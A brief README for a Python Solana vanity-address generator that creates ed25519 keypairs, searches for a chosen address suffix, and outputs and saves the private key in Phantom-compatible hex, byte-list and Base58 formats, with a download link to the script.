---

**sosca v0.7.1 – Phantom Wallet Key Converter for Solana**

This Python program generates an ed25519 keypair and converts the private key into multiple formats compatible with Phantom Wallet:

- **Solana Address:**  
  The public key is Base58-encoded and used as the Solana address.

- **Private Key (Hex):**  
  The 32-byte private key as a hexadecimal string.

- **Phantom-Compatible Private Key (64-Byte List):**  
  A combination of the 32-byte private key and 32-byte public key, output as a list.

- **Phantom-Compatible Private Key (Base58):**  
  The 64-byte key is also encoded as a Base58 string, compatible with Phantom Wallet.

**Workflow:**

1. The program displays an ASCII intro and prompts for a desired suffix (ending) for the Solana address.
2. It continuously generates keypairs until an address is found that matches the given suffix (or accepts any address if left empty).
3. Once a match is found, all relevant data (address, hex key, 64-byte list, and Base58 key) is shown and saved to `addresses.json`.

**Usage:**

Run the program with:
```bash
python <filename>.py
```
Follow the on-screen instructions in the terminal.

>> Use **BASED** as the download file under  
>> [https://xenex-ai.github.io/lab/solana/based/based_v1.py](https://xenex-ai.github.io/lab/solana/based/based_v1.py)  
>> Launch it and follow the instructions in your terminal.

---
